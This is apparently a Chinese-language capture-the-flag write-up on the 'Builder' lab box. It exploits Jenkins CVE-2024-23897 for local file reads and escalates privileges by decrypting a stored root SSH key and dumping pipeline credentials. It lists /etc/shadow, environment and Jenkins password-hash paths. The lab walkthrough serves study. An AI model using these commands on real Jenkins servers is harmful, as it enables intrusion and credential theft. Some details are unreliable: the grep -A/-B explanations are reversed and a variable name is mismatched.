---
title: Builder
description: 
tags:
  - Jenkins
  - CVE-2024-23897
date: 2026-07-08
---

## CVE-2024-23897

Jenkins 版本在 2.441 以下存在漏洞，這個漏洞能夠透過 `@` 來觸發機制，進而做到 LFI。攻擊流程如下，當然，也可以選擇直接用 [python poc](https://github.com/xaitax/CVE-2024-23897.git) 來玩。

```bash
# 1. 取得 Jenkins cli
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
# 2. POC 
java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help '@/etc/hostname'
```

## Privilege Escalation

### 方法一

我們發現 Jenkins 上可以翻到 root ssh private key 加密後的內容，此時，我們可以到 `dashboard -> Manage Jenkins -> Script Console`，輸入 `println(hudson.util.Secret.decrypt("{...}"))` 來解密，其中 `...` 就是我們拿到的加密內容，解密後就可以拿到 root 的 ssh private key。

### 方法二

從 Pipeline ssh 連線，sample 可以參考[這邊](https://www.jenkins.io/doc/pipeline/steps/ssh-agent/)

```bash
node {
    sshagent (credentials: ['deploy-dev']) {
        sh 'ssh -o StrictHostKeyChecking=no -l cloudbees 192.168.1.106 uname -a'
    }
}
# 調整 ip user 以及 credential id 後
node {
    sshagent (credentials: ['1']) {
        sh 'ssh -o StrictHostKeyChecking=no -l root 10.129.230.220 uname -a'
    }
}
```

### 方法三

直接從 Pipeline dump Credentials，可以參考[這邊](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials) 

```bash
node {
    withCredentials([
        sshUserPrivateKey(
            credentialsId: '1', 
            keyFileVariable: 'KEYFILE',
        )
    ]) {
        sh 'cat ${keyFile}'
    }
}
```

### 有用的技巧

#### 一、測試輸出數量

畢竟如果只以 help 或是 who-am-i 來測試的話，通常輸出只會有一行，能使用的效果有限。

```bash
cat commands | while read command; do echo "echo -n \"$command: \"; java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' $command '@/etc/passwd' 2>&1 | grep -oP ':\d+:\d+:' | sort -u | wc -l"; done > ipp.sh
oxdf@hacky$ bash ipp.sh
```

#### 二、重要檔案路徑

```bash
/etc/passwd
/etc/shadow
/etc/hostname
# 看當前執行環境的環境變數
/proc/self/environ
# 標準 Jenkins container 中的預設工作目錄
/var/jenkins_home
# 存放所有使用者資訊及使用者工作目錄（EX: jennifer_12108429903186576833）
/var/jenkins_home/users/users.xml
# 使用者的設定檔，讀完 users.xml 再過來這邊看，有機會翻到 passwordHash
/var/jenkins_home/users/<username>/config.xml
/var/jenkins_home/jennifer_12108429903186576833/config.xml
```

#### 三、hashcat 小技巧

```bash
hashcat --example-hashes | grep bcrypt -A 2 -B 2
```

- -A 2: 顯示前兩行
- -B 2: 顯示後兩行